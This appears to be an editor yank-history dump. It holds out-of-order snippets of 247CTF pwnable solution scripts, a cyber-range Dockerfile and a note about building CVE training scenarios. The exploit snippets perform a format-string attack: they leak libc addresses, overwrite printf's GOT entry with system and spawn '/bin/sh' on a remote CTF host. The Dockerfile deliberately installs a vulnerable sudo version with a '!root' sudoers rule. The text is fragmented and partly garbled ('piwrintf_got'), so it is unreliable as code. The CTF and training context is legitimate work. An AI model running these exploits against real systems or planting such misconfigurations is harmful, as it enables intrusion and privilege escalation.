	https://www.sudo.ws/sudo/dist/packages/1.8.27/sudo_1.8.27-1_ubu1804_amd64.deb && \
add8e652b2d9cd734b9e8ab5a4d5f1a5|file:///home/neo/cyberranges/work/mitre/easy14/Dockerfile|6|5|V|dockerfile
	    dpkg -i sudo_1.8.27-1_ubu1804_amd64.deb
fe1e06a19d73d48d192463ed692d065f|file:///home/neo/cyberranges/work/mitre/easy14/Dockerfile|6|1|V|dockerfile
	
	RUN useradd -m hacker && echo 'hacker ALL=(ALL,!root) /bin/bash' >> /etc/sudoers
	RUN echo "hacker:hacker" | chpasswd
	
28dbebb7e56d9fc442aeca1882c51a07|file:///home/neo/cyberranges/work/mitre/easy14/Dockerfile|5|5|V|dockerfile
	    wget 
d2f5b0581082edc2dc1311649b3c316b|file:///home/neo/cyberranges/work/mitre/easy14/Dockerfile|8|1|V|dockerfile
	USER hacker
36a2f01fb5f248340dcf588880b16b03|file:///home/neo/cyberranges/work/mitre/easy14/Dockerfile|5|5|V|dockerfile
	    apt-get install -y wget apache2 mariadb-server
eaa8d94f3f43af00b60575bf97e36959|file:///home/neo/cyberranges/work/mitre/easy14/Dockerfile|2|1|V|dockerfile
	FROM irespring/apache2-php
adba63aa635e193db03b15ea651c1e99|file:///home/neo/247ctf/networking/sol_com.py|6|1|V|python
	flag_payload = b''
	
	for p in packets:
	    flag_payload += p['ICMP'].load
	
	flag_file = open('error.jpeg', 'wb')
	flag_file.write(flag_payload)
7857c6f6685805ce5dbcdf0edd6d0fd6|file:///home/neo/247ctf/networking/sol_com.py|4|38|v|python
	 if p.src == '10.0.5.15'
f535c27b49b48c768d7e6b5d706c7027|file:///home/neo/247ctf/networking/sol_com.py|4|1|V|python
	packets = PacketList([p for p in pcap if p[TCP].src == '10.0.5.15'])
3f19fa555871565a5dbf7d83bfb28e19|file:///home/neo/247ctf/networking/sol_com.py|5|38|v|python
	 if p[TCP].src == '10.0.5.15'])
fd288dac4a34f9a30253465f13625086|file:///home/neo/247ctf/networking/sol_com.py|4|1|V|python
	# packets = PacketList([p for p in pcap if p[TCP].src == '10.0.5.15'])
c3beb22d8bb8a4b874fd7bb8a8914643|file:///home/neo/247ctf/pwnable/sol_confwrite.py|3|36|v|python
	50046
02b10e0444a466a22f5df7ff0293f5a9|file:///home/neo/247ctf/pwnable/sol_confwrite.py|6|12|v|python
	'0c3a6f0990b054c8.247ctf.com', 50390
5dcf1da52e24289e4b46b83cddce30b8|file:///home/neo/247ctf/pwnable/sol_confwrite.py|15|9|V|python
	        if addr[:4] == b'0xff':
16b008ef0aad3e0ee8da742384f300b9|file:///home/neo/247ctf/pwnable/sol_confwrite.py|6|1|V|python
	logging.level
31c78dd551fa4453e7c991776b730fec|file:///home/neo/247ctf/pwnable/sol_confwrite.py|9|12|v|python
	b'TESTTEST'
f92770fe4c228d59c7a5e032cf09d7cc|file:///home/neo/247ctf/pwnable/sol_confwrite.py|10|1|V|python
	payload = b'%11$s'
	payload += b'TESTTEST'
	r.sendline()
679e82bb2b6459e98720b007ac554397|file:///home/neo/247ctf/pwnable/sol_confwrite.py|31|1|V|python
	#         string = r.recvuntil('!')[:-1]
7d1c4fb01ec739b3f6fc56e3c0f8c97e|file:///home/neo/247ctf/pwnable/sol_confwrite.py|11|5|V|python
	    print(r.recvall())
402e8b4f366a0bdc9b91ee96f7050058|file:///home/neo/247ctf/pwnable/sol_confwrite.py|21|1|v|python
	for i in range(135):
	
71cd6f27d9c9f33ba6b7e1f397f68817|file:///home/neo/247ctf/pwnable/sol_confwrite.py|22|1|V|python
	#     r.recvuntil('?\n')
573d4685f43b7268033ba68f92c8b369|file:///home/neo/247ctf/pwnable/sol_confwrite.py|17|1|V|python
	context.update(arch='i')
362b3fd94de77f970c9cb285b7a8bcb9|file:///home/neo/247ctf/pwnable/sol_confwrite.py|21|1|V|python
	leak_addr(0x8048000)
fb43815e671a4ee30c77294d93adaf9a|file:///home/neo/247ctf/pwnable/sol_confwrite.py|22|11|v|python
	0x8048000
5577df5462446b5d338b5e01caf67410|file:///home/neo/247ctf/pwnable/sol_confwrite.py|22|1|V|python
	leak_addr(0x0a0a0a0a)
006f93170c99b0848535e7373a3d6ffb|file:///home/neo/247ctf/pwnable/sol_confwrite.py|6|1|V|python
	    # if b'\n' in addr:
	    #     return None
516a472e7bf7171849a6b09bf0b0ee6b|file:///home/neo/247ctf/pwnable/sol_confwrite.py|8|5|V|python
	    r.recvuntil('?\n')
7f89344bd129e165d6d025341b425644|file:///home/neo/247ctf/pwnable/sol_confwrite.py|12|5|v|python
	r.sendline(payload)
d542971085b1231888270e6e1a7f0b6e|file:///home/neo/247ctf/pwnable/sol_confwrite.py|12|1|V|python
	    r.sendline(payload)
	    r.recvuntil('back ')
	    data = r.recvuntil(b'TESTTEST', drop=True)
	    print(data)
eb35087f82653ab45bc55342ab50e8b6|file:///home/neo/247ctf/pwnable/sol_confwrite.py|23|26|v|python
	'%' + str(i) + '$p' + 'AAAA' + 'BBBB'
b9f3ec0cc9be8a2946d018c7d45a5325|file:///home/neo/247ctf/pwnable/sol_confwrite.py|21|1|V|python
	def find_leak_point():
	    log.info('Finding leak point')
	    for i in range(1, 20):
	        payload ='%' + str(i) + '$p' + 'AAA' + 'BBBB'
	        r = send_payload(payload.encode())
	        print(i,r)
	        if b'0x42424242' in r: # chr(0x42) = 'B'
	            return i
ce120f15eff93dc987f5f9b570daae37|file:///home/neo/247ctf/pwnable/sol_confwrite.py|10|1|V|python
	    data = r.recvuntil(b'!')
33ccd026ff4b914754c1b9382e0522b9|file:///home/neo/247ctf/pwnable/sol_confwrite.py|25|1|V|python
	find_leak_point()
0ca4f010e1c11f6c7ccbef06bb388da1|file:///home/neo/247ctf/pwnable/sol_confwrite.py|15|1|V|python
	    payload += b'aaa'
59297c3fb1a4580b23ce6c1b5d667d67|file:///home/neo/247ctf/pwnable/sol_confwrite.py|26|23|v|python
	42424242
f50881ced34c7d9e6bce100bf33dec60|file:///home/neo/247ctf/pwnable/sol_confwrite.py|25|61|v|python
	BBBB
206191ef66020d24de3fdcbdb6deea96|file:///home/neo/247ctf/pwnable/sol_confwrite.py|25|13|v|python
	exec_payload
7a8ef3f1a7a467f34d9a35ed1b2e9314|file:///home/neo/247ctf/pwnable/sol_confwrite.py|9|1|V|python
	    data = r.recvuntil(b'TESTTEST', drop=True)
67c1cbb549407d754fe1894f74b40c3e|file:///home/neo/247ctf/pwnable/sol_confwrite.py|10|26|v|python
	TESTTEST
95df2e9efa778ccd1c814f841d8df19d|file:///home/neo/247ctf/pwnable/sol_confwrite.py|26|26|v|python
	'%' + str(i) + '$p' + 'AAA' + 'BBBB'
a18a1054378cc0444c723eee61bc281e|file:///home/neo/247ctf/pwnable/sol_confwrite.py|34|1|V|python
	r = remote(host, port)
fa75913299aceda634e82a2d37ae7261|file:///home/neo/247ctf/pwnable/sol_confwrite.py|17|5|V|python
	    payload += b'TESTTEST'
dae07b805d711e81d5a63472513eb2f8|file:///home/neo/247ctf/pwnable/sol_confwrite.py|16|69|v|python
	set of bytes
752f0bdb7ae5a49504ca494e02f4b7e9|file:///home/neo/247ctf/pwnable/sol_confwrite.py|10|5|V|python
	    data = r.recvuntil(b'!', drop=True)
ab9276ead4d1bb9823c3cbee2ecf044a|file:///home/neo/247ctf/pwnable/sol_cookie.py|42|1|V|python
	def log_addr(name, addr):
	    log.info('{}: {:#x}'.format(name, addr))
f24814ef221bd4ddba52560ef6e6f645|file:///home/neo/247ctf/pwnable/sol_confwrite.py|48|1|V|python
	log_addr("System", system_addr)
55d8bcf494c22fac2fe4372ce532010b|file:///home/neo/247ctf/pwnable/sol_confwrite.py|48|15|v|python
	em", system_addr)
fccf4d569041cd96801e4f3c22aedcc1|file:///home/neo/247ctf/pwnable/sol_confwrite.py|48|20|v|python
	system_addr
6a6350989d26ee8374bf4bb80c8fe9a1|file:///home/neo/247ctf/pwnable/sol_confwrite.py|44|1|V|python
	d = DynELF(leak_addr, start_address_elf)
	dynamic_addr = d.dynamic
	log_addr("Dynamic", dynamic_addr)
	printf_addr = d.lookup('printf', 'libc')
	log_addr("Printf", printf_addr)
	system_addr = d.lookup('system', 'libc')
	log_addr("System", system_addr)
fb3d6b231117a45889a35d798118b202|file:///home/neo/247ctf/pwnable/sol_confwrite.py|24|1|V|python
	def find_plt_got():
9224bf5a352faf8876c18645fa5dd003|file:///home/neo/247ctf/pwnable/sol_confwrite.py|24|1|V|python
	    addr = dynamic_addr
	    while True:
	        x = d.leak.n(addr, 2)
	        if x == '\x03\x00': # PLT/GOT
	            addr += 4
	            return u32(d.leak.n(addr, 4))
	        addr += 0x10
633f9280ecb322e1e2876c1fd809f815|file:///home/neo/247ctf/pwnable/sol_confwrite.py|53|1|V|python
	addr = dynamic_addr
0c6d697fbfc1c77c5d1bc21dba859698|file:///home/neo/247ctf/pwnable/sol_confwrite.py|61|1|V|python
	d.leak.n()
417c1e1d69931559751bc8597487dfee|file:///home/neo/247ctf/pwnable/sol_confwrite.py|25|19|v|python
	_addr
baf4612a368e9e70375aa71de51619ec|file:///home/neo/247ctf/pwnable/sol_confwrite.py|28|31|v|python
	PLT/GOT
1dd9da977d489a2fb4435aac2850b9b6|file:///home/neo/247ctf/pwnable/sol_confwrite.py|64|1|v|python
	plt_got
18d8fc90e18dea2c85a05bf352b80343|file:///home/neo/247ctf/pwnable/sol_confwrite.py|28|9|V|python
	        print(d.leak.n(addr, 4))
d31116613e904b7bba75e107d12d5687|file:///home/neo/247ctf/pwnable/sol_confwrite.py|94|1|V|python
	payload = payload.encode()
6e0860bdce7b3d84f22245646f1b81ed|file:///home/neo/247ctf/pwnable/sol_confwrite.py|101|33|v|python
	0x1337babe
aaee0ef23997dc67a979f9ef12fcc5a4|file:///home/neo/247ctf/pwnable/sol_confwrite.py|98|1|V|python
	# r.sendline(b'/bin/sh')
37f57a267343a2a10dd263d5bd7a48e0|file:///home/neo/247ctf/pwnable/sol_confwrite.py|74|14|v|python
	find_printf
ed3410edc600a0e7a9e893af5748ae3c|file:///home/neo/247ctf/pwnable/sol_confwrite.py|77|1|V|python
	# payload = b''
	# addr = printf_got
	# val = system_plt
	# curout = 4
	# dist_to_addr = 12 + 3*20
	# reader = (dist_to_addr / 4) + 3
	# for i in range(8):
	#     diff = (val & 0xff) - curout
	#     curout = (val & 0xff)
	#     val //= 0x100
	#     if diff < 20:
	#         diff += 0x100
	#     payload += ('%0' + str(diff) + 'u').encode()
	#     payload += ('%' + str(reader) + '$hhn').encode()
	#     reader += 1
	
	# payload += b'A'*(dist_to_addr - len(payload))
	# for i in range(8):
	#     payload += p32(addr + i)
	
	# send_payload(payload)
a4a3998fc2a5771599aa8946dda7fb82|file:///home/neo/247ctf/pwnable/sol_confwrite.py|84|1|V|python
	# for i in range(135):
	#     r.recvuntil('?\n')
	#     r.sendline(f"%{i}$p")
	#     r.recvuntil('back ')
	#     addr = r.recvline().strip()[:-1]
	#     print("%d : %s" % (i, addr))
	#     try: 
	#         r.sendline(f"%{i}$s")
	#         r.recvuntil('back ')
	#         string = r.recvuntil('!')[:-1]
	#         print("String:", string)
	#     except:
	#         r = remote(host, port)
	#         continue
	
	
	
068aaf5d5ad9ce0002b08c2e49afe630|file:///home/neo/247ctf/pwnable/sol_confwrite.py|6|1|V|python
	def send_payload(payload, interactive=False):
	    # if b'\n' in payload:
	    #     return None
	    r.recvuntil('?\n')
	    r.sendline(payload)
	    r.recvuntil('back ')
	    if (interactive):
	        r.interactive()
	        return
	    data = r.recvuntil(b'!!!', drop=True)
	    return data
7263d1e520595a8873575cf9302efb57|file:///home/neo/247ctf/pwnable/sol_confwrite.py|7|1|V|python
	    # if b'\n' in payload:
	    #     return None
b4f130071b377a273139c9fca9006846|file:///home/neo/247ctf/pwnable/sol_confwrite.py|10|15|V|python
	    if (interactive):
	        r.interactive()
	        return
c20946d8ba23b3a03ee2f0652970627f|file:///home/neo/247ctf/pwnable/sol_confwrite.py|13|29|v|python
	, interactive=False
e97748ed7ce5fa0965d3c9cd8d0d587c|file:///home/neo/247ctf/pwnable/sol_confwrite.py|17|5|V|python
	    data = r.recvuntil(b'!!!', drop=True)
2431f65cb0009e9f5a6116b9dffb9d70|file:///home/neo/247ctf/pwnable/sol_confwrite.py|17|19|V|python
	    r.interactive()
	    return data
7084bdebbae6284e8af3b78730196495|file:///home/neo/247ctf/pwnable/sol_confwrite.py|77|1|V|python
	printf_got = find_got_func(got_addr, printf_plt)
	log_addr("Printf@got", printf_got)
3b4ffd000942b8bb82f5bd1fc9d6ede1|file:///home/neo/247ctf/pwnable/sol_confwrite.py|79|1|v|python
	piwrintf_got
b374b22364edd10bc62a90a6ba498a12|file:///home/neo/247ctf/pwnable/sol_confwrite.py|79|38|v|python
	printf_plt
7d0867619c5c7ebeaa84f16a0d99a7b9|file:///home/neo/247ctf/pwnable/sol_confwrite.py|80|24|v|python
	printf_got
d5621205dbad04e747b648b96b9a7b26|file:///home/neo/247ctf/pwnable/sol_confwrite.py|79|47|V|python
	system_got = find_got_func(got_addr, system_plt)
	log_addr("System@got", system_got)
765c89b16339dfdfd46a672cb9b20676|file:///home/neo/247ctf/pwnable/sol_confwrite.py|71|1|V|python
	system_plt = d.lookup('system', 'libc')
	log_addr("System@plt", system_plt)
4152caa000f30ffc1be1db1b6ed9d91f|file:///home/neo/247ctf/pwnable/sol_confwrite.py|74|24|v|python
	system_plt
66a9da9aa5d0e290c34326c23e5efd3f|file:///home/neo/247ctf/pwnable/sol_confwrite.py|73|5|V|python
	read_ = d.lookup('read', 'libc')
	log_addr("Read@plt", read_plt)
5a9423956ffb14be6ba531a890786d9f|file:///home/neo/247ctf/pwnable/sol_confwrite.py|81|1|V|python
	writes = {printf_got: system_plt}
	payload = fmtstr_payload(11, writes, 0, 'short')
00042d5426a107d085e6adcb5045f926|file:///home/neo/247ctf/pwnable/sol_confwrite.py|86|1|V|python
	# format_string.write(printf_got, system_plt)
	# format_string.execute_writes()
d897c84dc622fe6a8ef18215c330af0e|file:///home/neo/247ctf/pwnable/sol_confwrite.py|80|1|V|python
	# format_string = FmtStr(execute_fmt=send_payload_int, offset=13)
df45927c06e382c5aa03a301183f279e|file:///home/neo/247ctf/pwnable/sol_confwrite.py|61|1|V|python
	# data = leak_addr(start_address_elf)
	# print(data)
04727b568ea314b75546f49239c6a48e|file:///home/neo/247ctf/pwnable/sol_confwrite.py|58|1|V|python
	# find_leak_point()
a4422bdfb28fd0ca3e0d3ccaf687228a|file:///home/neo/247ctf/pwnable/sol_confwrite.py|46|1|V|python
	
	# def find_leak_point():
	#     log.info('Finding leak point')
	#     for i in range(1, 20):
	#         payload = '%' + str(i) + '$p' + 'AAA' + 'BBBB'
	#         r = send_payload(payload.encode())
	#         print(i, r)
	#         if b'0x42424242' in r: # chr(0x42) = 'B'
	#             return i
7e9b557b00abfc2f610ce50f152aa4bc|file:///home/neo/247ctf/pwnable/sol_confwrite.py|68|1|V|python
	writes = {printf_got: system_plt}
	payload = fmtstr_payload(11, writes, 0, 'short')
	send_payload_int(payload)
	r.sendline('/bin/sh;')
6fda37133347a8bdefb4d03cfef95035|file:///home/neo/247ctf/pwnable/sol_confwrite.py|48|1|V|python
	r = remote(host, port)
	
	start_address_elf = 0x8048000
	
	d = DynELF(leak_addr, start_address_elf)
	
	# Leak PLT addresses
	dynamic_addr = d.dynamic
	log_addr("Dynamic", dynamic_addr)
	printf_plt = d.lookup('printf', 'libc')
	log_addr("Printf@plt", printf_plt)
	system_plt = d.lookup('system', 'libc')
	log_addr("System@plt", system_plt)
	
	got_addr = find_plt_got(dynamic_addr)
	log_addr("GOT", got_addr)
	
	printf_got = find_got_func(got_addr, printf_plt)
	log_addr("Printf@got", printf_got)
	
	writes = {printf_got: system_plt}
	payload = fmtstr_payload(11, writes, 0, 'short')
	send_payload_int(payload)
	r.sendline('/bin/sh;')
	
	r.interactive()
	
a77ee5a1a8a2d2bd5519f457a419e97e|file:///home/neo/cyberranges/work/al.txt|1|1|V|text
	Good morning Al, I went through the first ~12-13 scenarios in the list you gave me, and I think that most of them cannot be done using the producer. Here is a brief summary:
	
	1. Many (more than half) of the scenarios are Windows scenarios. These can't be generated by the producer, since the produced images are Linux (but they can probably still be implemented, just not using the producer)
	2. Some (3-4) of the CVEs I have seen so far are Linux Kernel exploits. I have done some research and it looks like that even if the user is connected to a Docker container, the attack can still be performed as long as the underlying kernel is vulnerable. Hoever, in our case, the producer uses RancerOS with a new and patched Linux kernel. So, again, these scenarios can probably still be implemented, but not using the producer.
	3. A few (3-4) of the CVE are already created in the producer and I have tested them out, they work fine.
	4. I have created 2 CVEs which were not created in the producer previously.
	5. For now, I am only working to see which CVEs can be created in the producer, but I have not yet tried to combine two CVEs into a single scenario, as should eventually be done. Again, I'm not sure if this can be done using the producer, since the producer only creates one cloud template for each CVE. To do what we want, I guess that we will have to only create one CVE using the producer (where we can), and then manually add the second CVE in the created cloud template and bundle the template. For some scenarios, one CVE is a Linux CVE and the other is a Windows CVE, so for sure this would have to be done manually by creating a network with two or more machines.
	
	So in summary, I think most of the scenarios can be created manually (I haven't taken a look at the medium/advanced ones yet), but only a very small percentage of them can be built in the producer, as I understand.
b0f3592f7067bccc757a7797a7aeea93|file:///home/neo/cyberranges/work/mitre/scenarios.md|82|1|V|vimwiki
	    # CVE-2017-16995 (get_rekt KE)
	        - Linux kernel
68f12e50637e02b2fb6b54bf3de8ce14|file:///home/neo/cyberranges/work/mitre/scenarios.md|86|1|V|vimwiki
	    # CVE-2019-1040 (Drop the MIC)
583cb83ac8a0d443115ebd84e1e7e23a|file:///home/neo/cyberranges/work/mitre/scenarios.md|119|1|V|vimwiki
	    # CVE-2019-1040 (Drop the MIC)
	        - In easy 12 (Windows, maybe we have a scenario)
2b08407fcad7e37380c34771abc7e973|file:///home/neo/cyberranges/work/mitre/scenarios.md|114|1|V|vimwiki
	    # CVE-2017-16995 (get_rekt KE)
	        - In Easy 11 (Linux kernel)
cd8a906603276cb485d2f5c2d823dbe8|file:///home/neo/cyberranges/work/mitre/scenarios.md|129|9|V|vimwiki
	        - Need to create an interface for users to exploit the vulnerability
0ed9db2659d0854a6cdff281d3a370ce|file:///home/neo/cyberranges/work/mitre/scenarios.md|127|95|v|vimwiki
	apge
13fdf7559050b0ae552466959d59af90|file:///home/neo/cyberranges/work/mitre/scenarios.md|139|12|V|vimwiki
	### Medium 4
	    # CVE-2019-1405
e777412db9bac23f83645a060f9afb33|file:///home/neo/cyberranges/work/mitre/scenarios.md|139|1|V|vimwiki
	### Medium 5
4ae8e197b4d10bf289c38729735d5ba6|file:///home/neo/cyberranges/work/mitre/scenarios.md|153|1|V|vimwiki
	### Medium 7
851d593ab55ce72055ddfe913e178ae2|file:///home/neo/cyberranges/work/mitre/scenarios.md|26|1|V|vimwiki
	    # CVE-2018-15473 (openssh enum) 
	        - Image exists in producer - 45939 OpenSSH < 7.7 - User Enumeration (2)
	        - Works
e5cf938e1961e92a73e791818bbf1680|file:///home/neo/cyberranges/work/mitre/scenarios.md|162|5|V|vimwiki
	        - Image exists in producer - 45939 OpenSSH < 7.7 - User Enumeration (2)
197b84fd31728d0161c0592818314843|file:///home/neo/247ctf/pwnable/sol_environ.py|5|1|V|python
	for i in range(100):
	    r.recvuntil('?\n')
	    r.sendline('%'+str(i)+'$p')
	    r.recvuntil('back ')
	    addr = r.recvuntil('!')[:-1]
	    if addr[:4] == b'0xff':
	        r.sendline('%'+str(i)+'$s')
	        r.recvuntil('back ')
	        string = r.recvuntil('!')[:-1]
	        print(string)
	    print(i,addr)
805c54aae48c68c551a4431d4d2c604d|file:///home/neo/247ctf/pwnable/sol_less.py|44|1|V|python
	host = 'dcc554b6d4c495ba.247ctf.com'
7e85bcb66fb9a809d5ab4f62a8b8bea8|file:///home/neo/247ctf/pwnable/sol_less.py|50|22|v|python
	critical
2dedbe7cea865d3afa78a09f79e0a2e2|file:///home/neo/247ctf/pwnable/sol_less.py|50|1|V|python
	context.log_level = 'debug'
5fa8100bbb2cff05116b4aff64d69a9a|file:///home/neo/247ctf/pwnable/sol_less.py|58|1|V|python
	# printf_plt = d.lookup('printf', 'libc')
e6381eae136b279963079a1a9b917947|file:///home/neo/247ctf/pwnable/sol_less.py|58|1|V|python
	printf_plt = d.lookup('puts', 'libc')
2d789151d41f35ad3ff8e871ed5289ab|file:///home/neo/247ctf/pwnable/sol_less.py|49|1|V|python
	# context.log_level = 'critical'
6d523d24aaf2c7376567d5b7446038b0|file:///home/neo/247ctf/pwnable/sol_less.py|50|1|V|python
	context.log_level = 'info'
37aa97c7aa9e6bf1cc51665c2dd19c0c|file:///home/neo/247ctf/pwnable/sol_less.py|93|1|V|python
	    if "\n" in addr:
	        leaked += "\0"
	        print("derp")
	        continue
13a2f49c2affe058d5285dc5be171814|file:///home/neo/247ctf/pwnable/sol_less.py|21|1|V|python
	    payload = b'%13$s'
	    payload += b'!!!' # for padding, so that the %s references next bytes
	    payload += p32(addr)
2b1aa549e9c2e1fde4ba6c243d8b66b2|file:///home/neo/247ctf/pwnable/sol_less.py|93|5|V|python
	    send_payload()
71600c59050159c630c3f283ec3ab8c3|file:///home/neo/247ctf/pwnable/sol_less.py|97|1|V|python
	    chal.sendline("A"*6 + "%8$s" + "B"*6 + addr)
	    chal.recvuntil("A"*6)
	    leak = chal.recvuntil("B"*6)[:-6]
240349345992df7bb86e0de6d90e373f|file:///home/neo/247ctf/pwnable/sol_confwrite.py|36|34|v|python
	plt_addr
e46db892d2f3089a0d5caa6ceabb61bf|file:///home/neo/247ctf/pwnable/sol_less.py|55|1|V|python
	# Leak PLT addresses
4baf3ea0a1c6823be908f555815bfb8b|file:///home/neo/247ctf/pwnable/sol_less.py|57|1|V|python
	# printf_plt = d.lookup('printf', 'libc')
	# log_addr("Printf@plt", printf_plt)
	# system_plt = d.lookup('system', 'libc')
	# log_addr("System@plt", system_plt)
21098d893249a9c719fd1524cc5c5900|list:/commands|54|1|V|list
	python.setLinter	Select Linter
	python.setInterpreter	Select Interpreter
	prettier.formatFile
	snippets.openSnippetFiles	Edit snippets files of current document filetype.
	snippets.editSnippets	Edit user snippets file of current document filetype.
	workspace.showOutput	open output buffer to show output from languageservers or extensions.
	workspace.clearWatchman	run watch-del-all for watchman to free up memory.
	workspace.workspaceFolders	show opened workspaceFolders.
	workspace.renameCurrentFile	change current filename to a new name and reload it.
	extensions.toggleAutoUpdate	toggle auto update of extensions.
	workspace.diagnosticRelated	jump to related locations of current diagnostic.
	document.renameCurrentWord	rename word under cursor in current buffer by use multiple cursors.
	document.jumpToNextSymbol	Jump to next symbol highlight position.
	document.jumpToPrevSymbol	Jump to previous symbol highlight position.
	go.install.gomodifytags	Install / update gomodifytags
	go.install.goplay	Install / update goplay
	go.install.gopls	Install / update gopls
	go.install.gotests	Install / update gotests
	go.install.impl	Install / update impl
	go.playground	Run on go playground
	go.tags.add	Add tags to struct fields
	go.tags.add.line	Add tags to struct field in current line
	go.tags.add.prompt	Add tags to struct fields (prompt)
	go.tags.clear	Remove all tags from struct fields
	go.tags.clear.line	Remove all tags from struct fields in current line
	go.tags.remove	Remove tags from struct fields
	go.tags.remove.line	Remove tags from struct field in current line
	go.tags.remove.prompt	Remove tags from struct fields (prompt)
	go.test.generate.exported	Generate unit tests for exported functions in file
	go.test.generate.file	Generate unit tests for file
	go.test.toggle	Toggle test file
	go.version	Print extension version
	go.impl.cursor	Generate interface stubs
	java.updateLanguageServer	Download latest snapshots of jdt.ls from eclipse.org.
	java.projectConfiguration.update	Update project configuration
	java.open.serverLog	Open Java Language Server log file
	java.workspace.compile	Force Java compilation
	java.action.organizeImports	Organize Imports
	java.open.formatter.settings	Open Java formatter settings
	java.clean.workspace	Clean the Java language server workspace
	session.save	Save current vim state to session file.
	session.load	Load session by name.
	session.restart	Restart vim with current session.
	mru.validate	Validate mru files list, which remove files that doesn't exist.
	python.enableSourceMapSupport	Enable source map support for extension debugging
	python.sortImports	Sort Imports
	python.startREPL	Start REPL
	python.createTerminal	Create Terminal
	python.buildWorkspaceSymbols	Build Workspace Symbols
	python.execInTerminal	Run Python File in Terminal
	python.upgradePythonLanguageServer	Upgrade MPLS to latest stable version, restart coc.nvim required to take effect.
	python.viewOutput	Show output
	python.goToPythonObject	Go to Python Object
	python.enableLinting	Enable Linting
	python.runLinting	Run Linting
	sh.version	Print extension version
	sh.update.bash-language-server	Update bash-language-server
	tsserver.reloadProjects	Reload current project
	tsserver.openTsServerLog	Open log file of tsserver.
	tsserver.goToProjectConfig	Open project config file.
	tsserver.restart	Restart tsserver
	tsserver.watchBuild	Run `tsc --watch` for current project by use vim's job feature.
	tsserver.executeAutofix	Fix autofixable problems of current document.
	extensions.forceUpdateAll	remove all global extensions and install them
	editor.action.organizeImport	run organize import code action.
	tags.generate
	prettier.open-output
	python.setShebangInterpreter
	python.execSelectionInTerminal
	python.execSelectionInDjangoShell
	python.updateSparkLibrary
	yank.clean
ca41492ab718fbb1742b9ff300e21d05|list:/commands|42|1|V|list
	python.startREPL	Start REPL
	workspace.diagnosticRelated	jump to related locations of current diagnostic.
	go.tags.remove	Remove tags from struct fields
	session.restart	Restart vim with current session.
	tsserver.restart	Restart tsserver
	python.runLinting	Run Linting
	go.tags.remove.line	Remove tags from struct field in current line
	go.tags.remove.prompt	Remove tags from struct fields (prompt)
	tsserver.reloadProjects	Reload current project
	document.renameCurrentWord	rename word under cursor in current buffer by use multiple cursors.
	workspace.renameCurrentFile	change current filename to a new name and reload it.
	go.version	Print extension version
	sh.version	Print extension version
	mru.validate	Validate mru files list, which remove files that doesn't exist.
	go.playground	Run on go playground
	tags.generate
	go.tags.clear	Remove all tags from struct fields
	go.impl.cursor	Generate interface stubs
	python.setLinter	Select Linter
	python.sortImports	Sort Imports
	go.tags.add.prompt	Add tags to struct fields (prompt)
	go.tags.clear.line	Remove all tags from struct fields in current line
	java.open.serverLog	Open Java Language Server log file
	prettier.formatFile
	tsserver.watchBuild	Run `tsc --watch` for current project by use vim's job feature.
	prettier.open-output
	workspace.showOutput	open output buffer to show output from languageservers or extensions.
	java.clean.workspace	Clean the Java language server workspace
	python.setInterpreter	Select Interpreter
	python.createTerminal	Create Terminal
	python.execInTerminal	Run Python File in Terminal
	go.test.generate.file	Generate unit tests for file
	java.workspace.compile	Force Java compilation
	tsserver.executeAutofix	Fix autofixable problems of current document.
	workspace.clearWatchman	run watch-del-all for watchman to free up memory.
	tsserver.openTsServerLog	Open log file of tsserver.
	java.updateLanguageServer	Download latest snapshots of jdt.ls from eclipse.org.
	go.test.generate.exported	Generate unit tests for exported functions in file
	python.updateSparkLibrary
	document.jumpToPrevSymbol	Jump to previous symbol highlight position.
	extensions.forceUpdateAll	remove all global extensions and install them
	workspace.workspaceFolders	show opened workspaceFolders.
	tsserver.goToProjectConfig	Open project config file.
	java.action.organizeImports	Organize Imports
	editor.action.organizeImport	run organize import code action.
	python.setShebangInterpreter
	java.open.formatter.settings	Open Java formatter settings
	python.buildWorkspaceSymbols	Build Workspace Symbols
	python.enableSourceMapSupport	Enable source map support for extension debugging
	sh.update.bash-language-server	Update bash-language-server
	python.execSelectionInTerminal
	java.projectConfiguration.update	Update project configuration
	python.upgradePythonLanguageServer	Upgrade MPLS to latest stable version, restart coc.nvim required to take effect.
e671637139c6065fffea09d05efd224e|list:/commands|13|1|V|list
	python.startREPL	Start REPL
	workspace.diagnosticRelated	jump to related locations of current diagnostic.
	go.tags.remove	Remove tags from struct fields
	session.restart	Restart vim with current session.
	tsserver.restart	Restart tsserver
	go.tags.remove.line	Remove tags from struct field in current line
	go.tags.remove.prompt	Remove tags from struct fields (prompt)
	tsserver.reloadProjects	Reload current project
	document.renameCurrentWord	rename word under cursor in current buffer by use multiple cursors.
	workspace.renameCurrentFile	change current filename to a new name and reload it.
	prettier.formatFile
	prettier.open-output
	python.setInterpreter	Select Interpreter
	python.createTerminal	Create Terminal
	document.jumpToPrevSymbol	Jump to previous symbol highlight position.
	python.setShebangInterpreter
	tsserver.executeAutofix	Fix autofixable problems of current document.
	go.test.generate.exported	Generate unit tests for exported functions in file
	tags.generate
	java.open.serverLog	Open Java Language Server log file
	tsserver.watchBuild	Run `tsc --watch` for current project by use vim's job feature.
	mru.validate	Validate mru files list, which remove files that doesn't exist.
	go.tags.clear.line	Remove all tags from struct fields in current line
	go.test.generate.file	Generate unit tests for file
	java.clean.workspace	Clean the Java language server workspace
	tsserver.openTsServerLog	Open log file of tsserver.
	workspace.showOutput	open output buffer to show output from languageservers or extensions.
	java.updateLanguageServer	Download latest snapshots of jdt.ls from eclipse.org.
	extensions.forceUpdateAll	remove all global extensions and install them
	java.workspace.compile	Force Java compilation
	tsserver.goToProjectConfig	Open project config file.
	workspace.clearWatchman	run watch-del-all for watchman to free up memory.
	java.open.formatter.settings	Open Java formatter settings
	python.enableSourceMapSupport	Enable source map support for extension debugging
	workspace.workspaceFolders	show opened workspaceFolders.
	sh.update.bash-language-server	Update bash-language-server
	java.action.organizeImports	Organize Imports
	editor.action.organizeImport	run organize import code action.
	python.buildWorkspaceSymbols	Build Workspace Symbols
	java.projectConfiguration.update	Update project configuration
	python.upgradePythonLanguageServer	Upgrade MPLS to latest stable version, restart coc.nvim required to take effect.
6b80d7946d1794222394f42cb8a42489|list:/commands|7|1|V|list
	document.renameCurrentWord	rename word under cursor in current buffer by use multiple cursors.
	workspace.renameCurrentFile	change current filename to a new name and reload it.
	go.tags.remove.line	Remove tags from struct field in current line
	prettier.open-output
	tsserver.openTsServerLog	Open log file of tsserver.
	python.createTerminal	Create Terminal
	tsserver.goToProjectConfig	Open project config file.
	java.open.formatter.settings	Open Java formatter settings
	workspace.diagnosticRelated	jump to related locations of current diagnostic.
